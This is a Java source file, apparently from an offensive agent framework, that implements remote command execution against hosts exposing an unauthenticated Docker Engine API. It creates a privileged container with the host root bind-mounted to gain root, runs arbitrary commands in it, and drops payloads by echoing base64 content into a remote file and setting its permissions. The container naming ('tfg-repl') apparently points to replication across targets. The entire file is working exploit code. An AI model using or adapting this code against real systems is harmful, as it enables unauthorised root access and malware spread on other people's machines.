package com.spulido.agent.remote;

import java.util.Base64;

import com.spulido.agent.domain.task.TaskResult;

/**
 * Executes commands on a target by exploiting an unauthenticated Docker Engine API:
 * a privileged container with the host root bind-mounted (see {@link DockerApiClient})
 * gives root on the host with no pre-shared credentials. This is the genuine RCE
 * primitive for {@link TargetSession.ChannelType#DOCKER_API} sessions.
 */
public class DockerApiRemoteCommandExecutor implements RemoteCommandExecutor {

    private static final long INLINE_TRANSFER_MAX_BYTES = 2_000_000L;

    private final DockerApiClient client;

    public DockerApiRemoteCommandExecutor() {
        this(new DockerApiClient());
    }

    DockerApiRemoteCommandExecutor(DockerApiClient client) {
        this.client = client;
    }

    @Override
    public TaskResult execute(TargetSession session, String command, long timeoutSeconds) {
        String containerName = containerNameFor(session.getTargetIp());
        try {
            client.ensureExploitContainer(session.getTargetIp(), session.getDockerApiPort(), containerName,
                    (int) timeoutSeconds);
        } catch (Exception e) {
            return TaskResult.failure("docker-exploit-" + System.currentTimeMillis(),
                    "Failed to establish Docker API exploit container",
                    e.getMessage() != null ? e.getMessage() : "Unknown error");
        }
        return client.execInContainer(session.getTargetIp(), session.getDockerApiPort(), containerName, command,
                (int) timeoutSeconds);
    }

    @Override
    public TaskResult transferFile(TargetSession session, byte[] content, String remotePath, String permissions) {
        if (content.length > INLINE_TRANSFER_MAX_BYTES) {
            return TaskResult.failure("docker-transfer-" + System.currentTimeMillis(),
                    "File too large to push over the Docker API exec channel",
                    "size=" + content.length + " bytes exceeds inline limit of " + INLINE_TRANSFER_MAX_BYTES
                            + " bytes; the target must download large payloads itself (HTTP path)");
        }

        String base64Content = Base64.getEncoder().encodeToString(content);
        StringBuilder cmd = new StringBuilder("echo ").append(base64Content).append(" | base64 -d > ").append(remotePath);
        if (permissions != null && !permissions.isBlank()) {
            cmd.append(" && chmod ").append(permissions).append(' ').append(remotePath);
        }
        return execute(session, cmd.toString(), 30);
    }

    static String containerNameFor(String targetIp) {
        return "tfg-repl-" + targetIp.replaceAll("[^a-zA-Z0-9]", "-");
    }
}
